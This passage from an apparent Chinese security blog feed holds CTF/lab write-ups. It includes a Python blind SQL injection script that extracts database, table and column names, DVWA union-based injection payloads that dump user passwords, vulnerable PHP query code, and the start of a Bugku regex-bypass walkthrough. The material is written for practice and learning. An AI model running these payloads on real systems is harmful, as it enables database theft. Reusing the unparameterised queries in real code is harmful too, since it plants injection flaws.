if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql</title>
    <link href="https://Foxgrin.github.io//posts/39291/"/>
    <id>https://Foxgrin.github.io//posts/39291/</id>
    <published>2018-07-10T13:44:00.000Z</published>
    <updated>2018-07-11T07:21:27.549Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的sql注入关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include (&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关毫无过滤的sql语句</p><p>提示输入id，判断可能是数字型注入</p><p>输入1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>出现报错，从错误信息判断是数字型注入，且被单引号包裹 </p><p>输入1’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有报错</p><p>接下来判断查询字段数</p><p>输入1’ order by 3</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明查询字段数为2</p><p>那么就用联合查询来爆库</p><p>输入0’ union select database(),2 #</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#</p><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(column_name),2 from information_schema.columns where table_name=’users’#</p><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select password,user_id from users #</p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关很明显是数字型注入，通过选择表单中的数字作为注入点，我们可以用burp抓包修改post的id值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里id值虽然通过mysql_real_escape函数被转义处理，但是由于id没有被引号包裹，所以没有什么区别</p><p>先判断查询字段数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>字段数为2</p><p>接下来爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为这里单引号被包裹，所以users可以转成十六进制数从而绕过转义 </p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这关有两个页面，一个页面用来输入id值，输入的id值经过sql查询后的信息显示在主页面上</p><p>输入id值的页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$_SESSION[&apos;id&apos;]=$_POST[&apos;id&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Session ID:&quot;.$_SESSION[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>主页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关把post的id值赋值给session的id值</p><p>注入点仍然是id值</p><p>跟上面关卡没什么本质区别</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>数字验证正则绕过</title>
    <link href="https://Foxgrin.github.io//posts/25617/"/>
    <id>https://Foxgrin.github.io//posts/25617/</id>
    <published>2018-07-10T12:39:00.000Z</published>
    <updated>2018-07-10T13:28:30.327Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>请求方法必须为POST</p><p>首先弄明白正则匹配函数：</p><p>preg_match：执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0</p><p>preg_match_all:执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中</p><p>两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止</p><p>再弄明白几个正则匹配的特殊字符：</p><p>[:graph:] : 除空格，TAB外的所有字符<br>[:punct:] : 任何标点符号<br>[:digit:] : 任何数字<br>[:upper:] : 任何大写字母<br>[:lower:] : 任何小写字母</p><p>接下来来到第一个判断地方： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这个if语句执行成功，那么我们就获取不到后面的flag值，所以不能让if执行，也就是preg_match必须返回1，即正则匹配成功</p><p>在看正则表达式’/^[[:graph:]]{12,}$/’</p><p>必须以任意一个除空格，TAB外的标点符号开头和结尾，且出现至少12次</p><p>验证如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $a=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password);</span><br><span class="line">    echo &apos;$a=&apos;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入12个1，看到结果返回1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入小于12个，看到结果返回0</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里需要注意，输入’+’ 会被当做是空格处理，要先将’+’进行URL编码%2b </p><p><img src="/img/数字验证正则绕过/3.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>综上，第一个输入要求，输入除空格,TAB外的字符至少十二次</p><p>在看下一个判断条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>如果if语句成功执行，break退出循环，我们就得不到flag值</p><p>所以我们不能让if语句成功执行，也就是说要让全局匹配成功次数大于6次</p><p>在看正则表达式’/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/’</p><p>因为是全局匹配，所以匹配成功的条件是检测到任何符号出现1次以上或者任何数字出现1次以上或者任何大写字母出现1次以上或者任何小写字母出现1次以上，一旦匹配成功一次，就开始检测下一次的匹配，这么说有点难理解，直接上代码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    $a=preg_match_all($reg,$password,$arr);</span><br><span class="line">    echo &apos;$a=&apos;.$a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里输入1aB.</p><p>匹配的过程是这样的:先检测到1，符合[:digit:]出现1次，继续检测，检测到a，符合[:lower:]出现1次，继续检测，以此类推，所以最后检测成功次数为4</p><p>同时也可以看出返回的数组有两个元素，第一个元素是整个匹配结果，第二个元素是子模式的匹配结果 </p><p>关于返回数组的详情可以参考：<a href="https://blog.csdn.net/qq_27988539/article/details/77366329" target="_blank" rel="noopener">https://blog.csdn.net/qq_27988539/article/details/77366329</a> </p><p>这题因为不牵涉到数组，就不详细研究</p><p>重点关注成功匹配的次数</p><p>这里特别说明什么时候是一次匹配的结束，就是检测到不是属于同一种特殊字符为止，因为这里每种特殊字符可以出现1次或者多次，举个例子，我们输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第一次匹配结束是检测到a字符，不符合[:digit:]，所以开始第二次匹配</p><p>因为这里要成功匹配6次以上，所以每种类型的字符必须间隔出现6次以上，结合第一个条件，字符出现12个以上，于是我们可以输入11aaBB..22cc</p><p>验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo &apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来看第三个条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br></pre></td></tr></table></figure><p>如果$c&lt;3，那么我们就得不到flag值，也就是说要让$c&gt;=3，即成功匹配三次或以上</p><p>即出现三种类型字符或以上，按上面的输入：11aaBB..22cc，就行了，验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 